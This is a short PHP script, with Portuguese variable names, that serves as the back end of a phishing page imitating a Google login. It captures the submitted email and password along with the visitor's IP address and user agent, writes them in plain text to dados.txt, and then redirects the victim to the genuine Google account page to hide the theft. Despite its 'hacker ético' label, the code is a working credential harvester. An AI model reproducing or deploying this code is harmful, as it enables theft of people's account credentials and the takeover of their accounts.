<?php

$dados = filter_input_array(INPUT_POST, FILTER_DEFAULT);

if (isset($dados['btn_senha'])) {
  if (isset($dados['email']) && isset($dados['senha'])) {
    $usuario = htmlentities(addslashes($dados['email']));
    $senha = htmlentities(addslashes($dados['senha']));
  }
  
	if (isset($_SERVER['HTTP_CLIENT_IP'])) {
		$endereco_ip = $_SERVER['HTTP_CLIENT_IP'];
	}
	
	else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$endereco_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}

	else if (isset($_SERVER['REMOTE_ADDR'])) {
		$endereco_ip = $_SERVER['REMOTE_ADDR'];
	}
       
	$navegador = $_SERVER['HTTP_USER_AGENT'];

	$data = Date("d-m-Y");

	# Dados
	$dados = fopen('dados.txt', 'w');
	fwrite($dados, "Informaçôes do navegador:\n");
	fwrite($dados, "Navegador: {$navegador}\n");
	fwrite($dados, "Endereço IP: {$endereco_ip}\n");
	fwrite($dados, "\nInformaçôes de acesso:\n");
	fwrite($dados, "Usuário: {$usuario}\n");
	fwrite($dados, "Senha: {$senha}\n");
	fwrite($dados, "\n© Copyright hacker ético\n");
	header("Location: https://myaccount.google.com/?utm_source=sign_in_no_continue");
}
else {
  header('Location: ../loginEmail.php');
}
?>